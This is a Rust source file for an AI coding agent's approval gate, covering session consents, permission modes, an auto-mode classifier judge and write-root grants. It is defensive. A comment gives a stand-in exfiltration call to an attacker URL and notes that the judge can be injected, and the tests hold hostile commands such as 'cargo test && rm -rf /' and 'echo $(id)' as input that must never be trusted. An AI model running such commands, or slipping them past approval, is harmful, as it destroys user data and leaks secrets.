//! The approval gate's resolution layer: standing consents (config
//! `auto_allow` + session "a"), the session permission mode, the auto-mode
//! Flash judge, and the application of the user's explicit decision. The
//! batch machinery in `tool_result.rs` consults this before parking a call.

use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;

use crate::execution_policy::{PermissionMode, RiskLevel, accept_edits_approvable, command_shape};
use crate::model_registry::{AUTO_MODEL, DEEPSEEK_V4_FLASH};
use crate::runtime::AgentRuntime;
use crate::runtime::event::{RuntimeEvent, ToolCallId, TurnId, emit};
use crate::runtime::state::PendingToolBatch;
use crate::runtime::tool_result::BatchOutcome;
use crate::tool::{ApprovalDecision, ApprovalRequest, ToolCall, ToolResult, ToolRunOutcome};

/// Whether "approve for the whole session" may be recorded for a tool.
/// Shell-class tools are excluded: their risk lives in the per-call
/// arguments, so a blanket session consent would be misleading. The `job`
/// tool is excluded for the same reason — a session-allow granted on a
/// `cancel` prompt must not blanket-approve future `action=start` commands.
/// Root grants are excluded too: each request is about one specific
/// directory, and "always widen the boundary without asking" must not be a
/// recordable consent.
pub(super) fn session_allowable(tool_name: &str) -> bool {
    !matches!(
        crate::execution_policy::ExecPolicy::classify_tool(tool_name),
        crate::execution_policy::ToolKind::Shell
            | crate::execution_policy::ToolKind::Job
            | crate::execution_policy::ToolKind::RootGrant
    )
}

/// Whether a call is the `request_write_root` doorbell (see
/// [`crate::execution_policy::ToolKind::RootGrant`]).
pub(super) fn is_root_grant(tool_name: &str) -> bool {
    crate::execution_policy::ExecPolicy::classify_tool(tool_name)
        == crate::execution_policy::ToolKind::RootGrant
}

/// Whether a call is a network-native tool (`fetch_url`/`web_search`). Their
/// egress is intrinsic, so they carry no `network: true` argument — the
/// auto-mode egress floor must recognize them by kind, not by that flag, or the
/// classifier would decide a call whose only purpose is reaching the network.
fn is_network_tool(tool_name: &str) -> bool {
    crate::execution_policy::ExecPolicy::classify_tool(tool_name)
        == crate::execution_policy::ToolKind::Network
}

/// Prompt-time triage of a `request_write_root` call (see
/// [`AgentRuntime::root_grant_prompt_target`]).
pub(super) enum RootGrantPrompt {
    /// Not a root-grant call at all.
    NotRootGrant,
    /// The request resolves; this canonical directory is what the prompt
    /// must display and what the eventual grant must land on.
    Resolved(std::path::PathBuf),
    /// The request can never be granted (unresolvable, not a directory, or
    /// refused outright: home / filesystem root). The human is not prompted;
    /// the message goes straight back to the model.
    Refused(String),
}

/// Identity key of a *simple* shell command — e.g. `git status` from
/// `git status -s`, or `cargo test` from `cargo test --all`. Returns `None` for
/// non-shell calls and for compound/substitution/redirection commands, which
/// are never matched by the session shell allowlist (they keep prompting).
///
/// This is what "approve for session" records and later matches against. Using
/// the command identity rather than the bare program means approving
/// `git status` does NOT blanket-approve `git push`: the two resolve to
/// different keys, so a chained or sibling subcommand can't ride a prior
/// consent past the gate.
pub(super) fn session_shell_prefix(call: &ToolCall) -> Option<String> {
    // Only command-bearing calls (`shell`, or `job action=start`) record a
    // trusted prefix; status/tail/cancel must not. `ToolCall::shell_command` is
    // the single home for that rule.
    let command = call.shell_command()?.trim();
    if command.is_empty() || command.contains(['&', '|', ';', '\n', '`', '<', '>', '(', ')', '$']) {
        return None;
    }
    let tokens: Vec<&str> = command.split_whitespace().collect();
    if tokens.first().is_some_and(|token| token.contains('=')) {
        return None; // leading `FOO=bar` env assignment, not a plain program
    }
    let canonical = command_shape::identity(&tokens);
    (!canonical.is_empty()).then_some(canonical)
}

impl AgentRuntime {
    /// Whether a gated call may run without asking. Two independent layers:
    /// (1) standing consent — a configured `auto_allow` name or a session
    /// "a" — is mode-independent; (2) the session [`PermissionMode`] relaxes
    /// the gate more broadly. Policy hard-denials are unaffected either way:
    /// they short-circuit in the registry before any decision is consulted.
    /// (That covers commands the deny parser recognized — it is best-effort,
    /// so `Yolo`'s real containment is the OS sandbox, not the deny list.)
    pub(super) async fn auto_approval_granted(
        &self,
        call: &ToolCall,
        request: &ApprovalRequest,
        cancel: &CancellationToken,
    ) -> bool {
        // Widening the write boundary is a human decision in EVERY mode and
        // through EVERY consent channel: above Layer 1 so a config
        // `auto_allow` entry cannot become a standing root-grant (grants
        // must stay explicit per-directory actions), and above Layer 2 so
        // even Yolo prompts — Yolo's real containment is the OS sandbox, and
        // this call is precisely a request to widen that containment.
        if is_root_grant(&call.name) {
            return false;
        }
        // Layer 1: standing consent (config auto_allow + session memory).
        // Exact name match, not a prefix: standing consent must not stretch.
        // A prefix `"s"` would have covered every s-tool at once, and a tool
        // added later whose name happens to extend a consented entry would
        // have shipped pre-approved without anyone deciding that.
        if self.config.approval_auto_allow.contains(&call.name) {
            return true;
        }
        let user_task = {
            let state = self.state.lock().await;
            if state.session_approved.contains(&call.name) {
                return true;
            }
            // Shell isn't blanket session-approvable by name; trust at command
            // granularity instead ("a" remembered `cargo`, `git`, …).
            if let Some(prefix) = session_shell_prefix(call)
                && state.session_trusted_shell_prefixes.contains(&prefix)
            {
                return true;
            }
            state.current_prompt.clone().unwrap_or_default()
        }; // release the state lock before any mode logic (Auto awaits a judge)

        // Layer 2: session permission mode.
        match self.permission_mode() {
            PermissionMode::Default => false,
            PermissionMode::AcceptEdits => accept_edits_approvable(&call.name, &call.arguments),
            PermissionMode::Auto => {
                // Egress sits above the judge: opening the network is the
                // human's call (or `[sandbox] network = "always"`), never
                // something a classifier waves through. `request.network` is the
                // *declared* flag on shell/job/sub-agent calls; the network-
                // native tools (fetch_url/web_search) carry no such flag, so
                // they are floored by kind here too — otherwise an
                // `fetch_url http://attacker/exfil?d=<secrets>` was decided by
                // the Flash judge, a soft and injectable backstop, in Auto mode.
                // Short-circuits before the judge spends a request.
                !request.network
                    && !is_network_tool(&call.name)
                    && self
                        .auto_mode_approves(call, request, &user_task, cancel)
                        .await
            }
            PermissionMode::Yolo => true,
        }
    }

    /// Auto mode: a Flash classifier judges the call. Three hard floors below
    /// the judge: the top risk tier always asks (the judge can't wave it
    /// through), the offline echo backend can't judge, and a cancel mid-flight
    /// aborts into "ask". Everything else the classifier decides, failing safe
    /// to a prompt. The judge's token usage is billed to the session.
    async fn auto_mode_approves(
        &self,
        call: &ToolCall,
        request: &ApprovalRequest,
        user_task: &str,
        cancel: &CancellationToken,
    ) -> bool {
        // Auto is at least as permissive as AcceptEdits (it sits above it in the
        // mode cycle), so inherit its bounded fs-edit allowances first. Without
        // this, a "more permissive" mode would ask for a plain `mkdir src/x`
        // that the stricter AcceptEdits waves through — shell defaults to the
        // High risk tier, which the judge floor below always prompts on.
        if accept_edits_approvable(&call.name, &call.arguments) {
            return true;
        }
        if request.risk_level == RiskLevel::High {
            return false;
        }
        if self.client.provider_name() == crate::echo_client::EchoClient::PROVIDER {
            return false;
        }
        let action = crate::approval_classifier::action_summary(&call.arguments);
        let input = crate::approval_classifier::ClassifierInput {
            tool_name: &call.name,
            action: &action,
            risk_level: request.risk_level,
            safety_notes: &request.safety_notes,
            user_task,
        };
        let model = self.classifier_model();
        // Race the judge against cancellation so Esc during a slow classifier
        // reply aborts the call into "ask" instead of blocking the turn.
        let (approved, usage) = tokio::select! {
            biased;
            () = cancel.cancelled() => return false,
            verdict = crate::approval_classifier::approves(&*self.client, &model, &input) => verdict,
        };
        if let Some(usage) = usage {
            self.record_classifier_cost(&model, &usage).await;
        }
        approved
    }

    /// The model the auto-mode classifier runs on (see [`classifier_model_for`]).
    fn classifier_model(&self) -> String {
        classifier_model_for(&self.config, &self.registry)
    }

    /// Fold a classifier call's token cost into the running session total. The
    /// judge runs on a separate (cheap) model from the turn, so its usage never
    /// flows through the turn telemetry; without this the session cost silently
    /// under-counts every auto-mode gated call.
    async fn record_classifier_cost(&self, model: &str, usage: &crate::model::Usage) {
        let cost = crate::pricing::calculate_turn_cost(model, usage);
        let cache_hit = usage.prompt_cache_hit_tokens.unwrap_or(0);
        let cache_miss = usage.prompt_cache_miss_tokens.unwrap_or(0);
        let savings = crate::pricing::cache_savings(model, cache_hit);
        let mut state = self.state.lock().await;
        state.session_cost.usd += cost.usd;
        state.session_cost.cny += cost.cny;
        // Fold cache tokens too, so the session cache-hit rate/savings read
        // consistently with `accumulate_request_usage`.
        state.session_cache_hit_tokens += u64::from(cache_hit);
        state.session_cache_miss_tokens += u64::from(cache_miss);
        state.session_cache_savings.usd += savings.usd;
        state.session_cache_savings.cny += savings.cny;
    }

    /// `denial_note`, when present and the decision denies, replaces the
    /// stock "denied by user" result text — the unattended sub-agent path
    /// resolves approvals by policy, and telling the child a user refused
    /// would be a false statement (see `subagent_approval_decision`).
    pub(super) async fn handle_approval(
        &self,
        pending: PendingToolBatch,
        decision: ApprovalDecision,
        denial_note: Option<String>,
        tx: &mpsc::UnboundedSender<RuntimeEvent>,
    ) {
        let cancel = self.state.lock().await.cancel.clone();
        let PendingToolBatch {
            current,
            remaining,
            turn_id,
            root_grant_target,
        } = pending;
        if cancel.is_cancelled() {
            let mut calls = remaining;
            calls.push_front(current);
            self.finish_cancelled_calls(calls, &turn_id, tx).await;
            return;
        }
        // "Approve for session" is recorded here and executes as a plain
        // approve; shell-class tools only get the one-time approval.
        let decision = if decision == ApprovalDecision::ApprovedForSession {
            if session_allowable(&current.name) {
                self.state
                    .lock()
                    .await
                    .session_approved
                    .insert(current.name.clone());
            } else if let Some(prefix) = session_shell_prefix(&current) {
                // Shell: remember this command's program for the session so
                // repeated `cargo`/`git`/… stop prompting (compound commands
                // still prompt — `session_shell_prefix` returns None for them).
                self.state
                    .lock()
                    .await
                    .session_trusted_shell_prefixes
                    .insert(prefix);
            }
            ApprovalDecision::Approved
        } else {
            decision
        };
        // `request_write_root` never executes as a registry tool: granting is
        // a runtime state transition (widen the shared boundary, persist,
        // notify UIs), performed here — the single point every decision path
        // (TUI keypress, serve HTTP, headless/sub-agent auto-deny) flows
        // through via `submit_approval`.
        if is_root_grant(&current.name) {
            let result = match decision {
                ApprovalDecision::Denied => {
                    let mut result = ToolResult::denied(&current);
                    // The unattended note wins: "user declined" is only true
                    // when a user actually saw the prompt.
                    result.content = denial_note.clone().unwrap_or_else(|| {
                        format!(
                            "User declined the write-root request for '{}'. Do not request \
                             this path again; continue within the granted roots, or the user \
                             can grant it later with /add-dir.",
                            root_grant_requested_path(&current)
                        )
                    });
                    result
                }
                _ => {
                    self.apply_root_grant(&current, root_grant_target.as_deref(), &turn_id, tx)
                        .await
                }
            };
            self.record_tool_result(&current, result, tx, turn_id.clone())
                .await;
            if self
                .process_tool_batch(remaining, &turn_id, &cancel, tx)
                .await
                == BatchOutcome::Completed
            {
                self.run_loop(tx).await;
            }
            return;
        }
        match self
            .run_tool(&current, Some(decision), &cancel, &turn_id, tx)
            .await
        {
            Ok(ToolRunOutcome::Result { mut result }) => {
                // Same substitution as the root-grant arm above: an unattended
                // denial carries its real reason instead of "denied by user".
                if result.status == crate::tool::ToolResultStatus::Denied
                    && let Some(note) = denial_note
                {
                    result.content = note;
                }
                self.record_tool_result(&current, result, tx, turn_id.clone())
                    .await;
            }
            Ok(ToolRunOutcome::ApprovalRequired { mut request }) => {
                request.preview = self.approval_preview(&current);
                {
                    let mut state = self.state.lock().await;
                    state.pending = Some(PendingToolBatch {
                        current,
                        remaining,
                        turn_id: turn_id.clone(),
                        // A root grant never reaches this re-prompt path (it
                        // is intercepted above, before run_tool); None keeps
                        // the grant fail-closed if that ever changes.
                        root_grant_target: None,
                    });
                }
                emit(
                    tx,
                    RuntimeEvent::ApprovalRequired {
                        turn_id: Some(turn_id),
                        tool_call_id: Some(ToolCallId::from(request.call_id.clone())),
                        request,
                    },
                );
                return;
            }
            Err(error) => {
                let result = ToolResult::error(&current, error.to_string());
                self.record_tool_result(&current, result, tx, turn_id.clone())
                    .await;
            }
        }

        // Resolved call recorded; drain the rest of the batch, then resume the
        // loop to feed all tool results into the next chat turn.
        if self
            .process_tool_batch(remaining, &turn_id, &cancel, tx)
            .await
            == BatchOutcome::Completed
        {
            self.run_loop(tx).await;
        }
    }

    /// Human-reviewable preview for a gated call, built against the live
    /// boundary so absolute paths into mid-session grants resolve too.
    pub(super) fn approval_preview(&self, call: &ToolCall) -> Option<String> {
        let boundary = self.boundary.as_ref()?;
        crate::approval_preview::build_approval_preview(call, &boundary.to_roots(), self.ui_lang())
    }

    /// Prompt-time triage of a call about to be parked for approval. For a
    /// `request_write_root` this resolves the requested path ONCE: the same
    /// canonical value goes to the panel (`ApprovalRequest::resolved_target`)
    /// and into the pending batch, so what the human reads and what the grant
    /// is checked against cannot drift. A request that cannot resolve (or is
    /// refused outright) never reaches the human at all — the model gets the
    /// precise reason instead of a puzzled denial.
    pub(super) fn root_grant_prompt_target(&self, call: &ToolCall) -> RootGrantPrompt {
        if !is_root_grant(&call.name) {
            return RootGrantPrompt::NotRootGrant;
        }
        // Strict schema check first: an argument set the tool's own
        // `deny_unknown_fields` would reject must never reach the human,
        // because an extra key can decide which line the panel shows the
        // human while the grant still lands on `path` — see
        // [`crate::root_grant::parse_arguments`].
        let raw = match crate::root_grant::parse_arguments(&call.arguments) {
            Ok(path) => path,
            Err(reason) => return RootGrantPrompt::Refused(reason),
        };
        let Some(boundary) = self.boundary.as_ref() else {
            return RootGrantPrompt::Refused(
                "this session has no workspace boundary to widen (filesystem tools are disabled)"
                    .to_string(),
            );
        };
        match boundary.resolve_grant_target(std::path::Path::new(&raw)) {
            Ok(canonical) => RootGrantPrompt::Resolved(canonical),
            Err(error) => RootGrantPrompt::Refused(error.to_string()),
        }
    }

    /// Perform an APPROVED `request_write_root`: widen the shared boundary,
    /// persist the grant next to the `--add-dir` ones (it must survive
    /// resume), and notify UIs. Returns the model-facing result; failures are
    /// soft (status=Error text) so the model can correct the path and — with
    /// a fresh approval — try again.
    ///
    /// `prompt_target` is the canonical directory resolved when the prompt
    /// was built — the path the human actually read. The request is resolved
    /// AGAIN here and must land on that exact value: a symlink retargeted
    /// between prompt and approval (the requester can write inside the
    /// workspace without approval, so it can shuffle links there) refuses
    /// instead of granting a directory the human never saw.
    async fn apply_root_grant(
        &self,
        call: &ToolCall,
        prompt_target: Option<&std::path::Path>,
        turn_id: &TurnId,
        tx: &mpsc::UnboundedSender<RuntimeEvent>,
    ) -> ToolResult {
        use crate::workspace_policy::RootGrantOutcome;
        // Re-validated, not just re-read: the grant must agree with the prompt
        // about which argument set it is acting on, not merely about the path.
        let raw = match crate::root_grant::parse_arguments(&call.arguments) {
            Ok(path) => path,
            Err(reason) => return ToolResult::error(call, reason),
        };
        let Some(boundary) = self.boundary.as_ref() else {
            return ToolResult::error(
                call,
                "this session has no workspace boundary to widen (filesystem tools are disabled)",
            );
        };
        let Some(prompt_target) = prompt_target else {
            // No recorded target means no resolved directory was displayed;
            // granting anything would be granting sight-unseen. Fail closed.
            return ToolResult::error(
                call,
                "no resolved directory was recorded when the user was prompted; nothing was \
                 granted — call request_write_root again",
            );
        };
        let fresh = match boundary.resolve_grant_target(std::path::Path::new(&raw)) {
            Ok(canonical) => canonical,
            Err(error) => return ToolResult::error(call, error.to_string()),
        };
        if fresh != prompt_target {
            return ToolResult::error(
                call,
                format!(
                    "nothing was granted: '{raw}' resolved to '{}' when the user was prompted \
                     but resolves to '{}' now — the path changed underneath the approval; call \
                     request_write_root again so the user can judge the current target",
                    prompt_target.display(),
                    fresh.display()
                ),
            );
        }
        match boundary.grant_resolved(fresh) {
            RootGrantOutcome::Granted { canonical } => {
                // Same durability contract as --add-dir: the grant is part of
                // the session, so a resume must restore it.
                let persisted = if let Some(persistence) = self.persistence.as_ref() {
                    {
                        let mut record = persistence.record.lock().await;
                        if !record.extra_roots.contains(&canonical) {
                            record.extra_roots.push(canonical.clone());
                        }
                        record.touch();
                    }
                    persistence.actor.request_save();
                    true
                } else {
                    false
                };
                let path = canonical.display().to_string();
                emit(
                    tx,
                    RuntimeEvent::RootGranted {
                        turn_id: Some(turn_id.clone()),
                        path: path.clone(),
                    },
                );
                // Durability is claimed only when there is a record to carry
                // it. A session whose store was unavailable runs in memory
                // (`launch_runtime` degrades to that with a warning), and there
                // the grant genuinely does not survive — telling the model
                // otherwise is a false statement it would plan around.
                let durability = if persisted {
                    "the grant persists across resume"
                } else {
                    "this session is not being persisted, so the grant ends with it"
                };
                ToolResult::success(
                    &call.id,
                    &call.name,
                    format!(
                        "Write access granted: '{path}' is now a writable root for the rest of \
                         this session (writes there work immediately; {durability}). Reference \
                         files under it by absolute path."
                    ),
                )
            }
            RootGrantOutcome::AlreadyGranted { canonical } => ToolResult::success(
                &call.id,
                &call.name,
                format!(
                    "'{}' is already inside the granted roots — writes there work today; \
                     no new grant was needed.",
                    canonical.display()
                ),
            ),
        }
    }
}

/// The `path` argument of a `request_write_root` call, trimmed ("" when
/// absent/malformed — the caller degrades that into an invalid-arguments
/// result rather than panicking on model output).
fn root_grant_requested_path(call: &ToolCall) -> String {
    call.arguments
        .get("path")
        .and_then(|value| value.as_str())
        .map(str::trim)
        .unwrap_or_default()
        .to_string()
}

/// The model the auto-mode classifier runs on. Flash is the cheap judge tier;
/// `auto`/unset routing sentinels and any catalog model resolve to it. A model
/// string the catalog does not know — a passthrough id, e.g. a newer DeepSeek
/// model the registry hasn't caught up to — is judged on itself rather than on a
/// Flash that may not exist for it. This stays DeepSeek-centric: cost for an
/// off-catalog model records as zero (pricing is table-driven), so an off-DeepSeek
/// `base_url` is best-effort, not a supported multi-provider mode. Either way the
/// raw `auto` sentinel never leaks to the API layer.
fn classifier_model_for(
    config: &crate::config::AgentConfig,
    registry: &crate::model_registry::ModelRegistry,
) -> String {
    let configured = config.model.trim();
    if configured.is_empty()
        || configured.eq_ignore_ascii_case(AUTO_MODEL)
        || registry.info_for(configured).is_some()
    {
        return DEEPSEEK_V4_FLASH.to_string();
    }
    configured.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn classifier_model_maps_to_flash_or_concrete_model() {
        use crate::config::AgentConfig;
        use crate::model_registry::ModelRegistry;
        let reg = ModelRegistry::default();
        let cfg = |model: &str| AgentConfig {
            model: model.to_string(),
            ..AgentConfig::builtin()
        };
        // DeepSeek sentinels and catalog models → the cheap Flash judge.
        assert_eq!(classifier_model_for(&cfg("auto"), &reg), DEEPSEEK_V4_FLASH);
        assert_eq!(classifier_model_for(&cfg(""), &reg), DEEPSEEK_V4_FLASH);
        assert_eq!(
            classifier_model_for(&cfg("deepseek-v4-pro"), &reg),
            DEEPSEEK_V4_FLASH
        );
        // A passthrough id the catalog doesn't know (e.g. a newer DeepSeek model
        // the registry hasn't caught up to) is judged on itself — and the raw
        // "auto" sentinel never leaks to the API layer.
        assert_eq!(
            classifier_model_for(&cfg("deepseek-v9-experimental"), &reg),
            "deepseek-v9-experimental"
        );
    }

    fn shell(command: &str) -> ToolCall {
        ToolCall {
            id: "c1".to_string(),
            name: "shell".to_string(),
            arguments: json!({ "command": command }),
        }
    }

    fn job_start(command: &str) -> ToolCall {
        ToolCall {
            id: "c1".to_string(),
            name: "job".to_string(),
            arguments: json!({ "action": "start", "command": command }),
        }
    }

    #[test]
    fn shell_prefix_covers_job_start_but_not_other_actions() {
        assert_eq!(
            session_shell_prefix(&job_start("cargo test --all")),
            Some("cargo test".to_string())
        );
        let cancel = ToolCall {
            id: "c1".to_string(),
            name: "job".to_string(),
            arguments: json!({ "action": "cancel", "job_id": "job_1" }),
        };
        assert_eq!(session_shell_prefix(&cancel), None);
    }

    #[test]
    fn shell_prefix_is_arity_classified_not_just_leading_program() {
        // Flags on the same subcommand collapse to the same key.
        assert_eq!(
            session_shell_prefix(&shell("cargo test --all")),
            Some("cargo test".to_string())
        );
        assert_eq!(
            session_shell_prefix(&shell("  Git Status --porcelain  ")),
            Some("git status".to_string())
        );
        // A bare program with no known subcommand falls back to the program.
        assert_eq!(
            session_shell_prefix(&shell("ls -la")),
            Some("ls".to_string())
        );
    }

    #[test]
    fn session_allow_of_one_subcommand_does_not_cover_a_sibling() {
        // Regression (exfil vector): approving `git status` for the session must
        // not silently auto-approve `git push`. Distinct arity keys ⇒ the push
        // still prompts.
        let allowed = session_shell_prefix(&shell("git status")).unwrap();
        let pushed = session_shell_prefix(&shell("git push origin main")).unwrap();
        assert_eq!(allowed, "git status");
        assert_eq!(pushed, "git push");
        assert_ne!(allowed, pushed);
    }

    #[test]
    fn shell_prefix_rejects_compound_and_substitution() {
        // The guard against `cargo … && rm -rf /` riding a trusted `cargo`.
        for command in [
            "cargo test && rm -rf /",
            "ls | grep foo",
            "a; b",
            "echo `whoami`",
            "echo $(id)",
            "cat < file",
            "echo x > y",
            "FOO=bar cargo test",
            "",
        ] {
            assert_eq!(
                session_shell_prefix(&shell(command)),
                None,
                "must not trust: {command:?}"
            );
        }
    }

    #[test]
    fn shell_prefix_is_none_for_non_shell_tools() {
        let call = ToolCall {
            id: "c1".to_string(),
            name: "write_file".to_string(),
            arguments: json!({ "path": "x", "content": "y" }),
        };
        assert_eq!(session_shell_prefix(&call), None);
    }

    /// "Approve for session" must not be recordable for a root grant: each
    /// request is about one directory, and a standing "always widen the
    /// boundary" consent must not exist.
    #[test]
    fn root_grant_is_never_session_allowable() {
        assert!(!session_allowable("request_write_root"));
        // Sanity: ordinary tools stay recordable.
        assert!(session_allowable("write_file"));
    }

    /// `root_grant_requested_path` feeds the panel's "requested spelling"
    /// line and the invalid-arguments degradation: trimmed when present,
    /// empty (never a panic) on every malformed shape a model can emit.
    #[test]
    fn requested_path_trims_and_degrades_to_empty() {
        let call = |arguments: serde_json::Value| crate::tool::ToolCall {
            id: "c1".to_string(),
            name: crate::root_grant::REQUEST_WRITE_ROOT_TOOL.to_string(),
            arguments,
        };
        assert_eq!(
            root_grant_requested_path(&call(json!({"path": "  /tmp/x  "}))),
            "/tmp/x"
        );
        assert_eq!(root_grant_requested_path(&call(json!({}))), "");
        assert_eq!(root_grant_requested_path(&call(json!({"path": 7}))), "");
    }

    /// Classifier spend folds ADDITIVELY into the session totals — the "cost
    /// honesty" the status line sells. Every `+=` in
    /// `record_classifier_cost` was mutable to `-=`/`*=` with the suite
    /// green: nothing anywhere asserted the arithmetic. Integer cache
    /// counters are pinned exactly; the money totals are pinned as strictly
    /// increasing across a second fold (kills `-=`, and `*=` on a
    /// zero-initialised total stays zero). The table rates the judge in BOTH
    /// currencies, and the asserts pin both on purpose — per currency, never
    /// summed, so the currencies cannot mask each other; if the table ever
    /// goes single-currency, this test must change with it, as a red test,
    /// not by silently covering less.
    #[tokio::test]
    async fn classifier_cost_folds_additively_into_the_session() {
        struct MuteClient;
        #[async_trait::async_trait]
        impl crate::client::LlmClient for MuteClient {
            fn provider_name(&self) -> &'static str {
                "mute"
            }
            fn model(&self) -> &str {
                "mute"
            }
            async fn stream_chat(
                &self,
                _request: crate::model::ChatRequest,
            ) -> crate::error::AgentResult<crate::client::AgentEventStream> {
                unreachable!("the classifier-cost test never talks to a model")
            }
        }

        let runtime =
            crate::runtime::AgentRuntime::new(MuteClient, crate::tool::ToolRegistry::default());
        // The wrapper around `classifier_model_for`, pinned on the same
        // runtime: builtin config routes to the Flash judge.
        assert_eq!(runtime.classifier_model(), DEEPSEEK_V4_FLASH);

        let usage = crate::model::Usage {
            prompt_tokens: Some(100),
            completion_tokens: Some(50),
            total_tokens: Some(150),
            reasoning_tokens: None,
            prompt_cache_hit_tokens: Some(10),
            prompt_cache_miss_tokens: Some(5),
        };
        runtime
            .record_classifier_cost(DEEPSEEK_V4_FLASH, &usage)
            .await;
        let (cost_1, savings_1) = {
            let state = runtime.state.lock().await;
            assert_eq!(state.session_cache_hit_tokens, 10);
            assert_eq!(state.session_cache_miss_tokens, 5);
            // Per-currency, not summed: the table prices Flash in BOTH
            // currencies, and a summed assert lets the currencies mask each
            // other (`*=` zeroing one while `+=` still moves the other).
            assert!(state.session_cost.usd > 0.0, "usd rate is in the table");
            assert!(state.session_cost.cny > 0.0, "cny rate is in the table");
            assert!(state.session_cache_savings.usd > 0.0);
            assert!(state.session_cache_savings.cny > 0.0);
            (state.session_cost, state.session_cache_savings)
        };

        runtime
            .record_classifier_cost(DEEPSEEK_V4_FLASH, &usage)
            .await;
        let state = runtime.state.lock().await;
        assert_eq!(state.session_cache_hit_tokens, 20);
        assert_eq!(state.session_cache_miss_tokens, 10);
        assert!(
            state.session_cost.usd > cost_1.usd,
            "usd must fold additively"
        );
        assert!(
            state.session_cost.cny > cost_1.cny,
            "cny must fold additively"
        );
        assert!(state.session_cache_savings.usd > savings_1.usd);
        assert!(state.session_cache_savings.cny > savings_1.cny);
    }
}
